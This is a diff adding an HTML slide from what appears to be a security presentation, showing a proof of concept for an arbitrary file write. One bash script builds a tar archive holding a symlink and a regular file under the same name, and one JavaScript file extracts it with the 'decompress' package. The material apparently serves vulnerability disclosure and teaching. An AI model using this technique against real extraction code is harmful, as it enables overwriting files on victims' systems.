@@ -1,0 +1,45 @@
+<section>
+  <h2 class="section-title">PoC &mdash; building the archive</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="card card-red">
+        <div class="card-header">build_exploit.sh</div>
+        <pre><code class="language-bash">#!/bin/bash
+set -e
+
+mkdir -p poc &amp;&amp; cd poc
+
+# Entry 1 &mdash; the symlink that points
+# wherever we want to write
+ln -s /tmp/pwned aaaaa
+tar -cf exploit.tar aaaaa
+
+# Replace it with a regular file of the
+# same name and append it to the tar
+rm aaaaa
+echo "ARBITRARY WRITE" &gt; aaaaa
+tar -rf exploit.tar aaaaa
+
+# Result: one tarball with TWO entries
+# both named 'aaaaa'
+tar -tvf exploit.tar</code></pre>
+      </div>
+    </div>
+    <div class="col">
+      <div class="card card-blue">
+        <div class="card-header">trigger.js</div>
+        <pre><code class="language-javascript">const decompress = require('decompress');
+
+decompress('poc/exploit.tar', 'dist')
+  .then(files =&gt; {
+    console.log('extracted', files.length);
+  })
+  .catch(err =&gt; console.error(err));</code></pre>
+      </div>
+      <div class="textbox" style="margin-top: 16px;">
+        <p><span class="inline-tag tag-purple">Format</span> tar accepts duplicate names natively. zip too &mdash; both work.</p>
+        <p><span class="inline-tag tag-purple">Target</span> need not exist: <code>O_CREAT</code> on the symlink will create it.</p>
+      </div>
+    </div>
+  </div>
+</section>
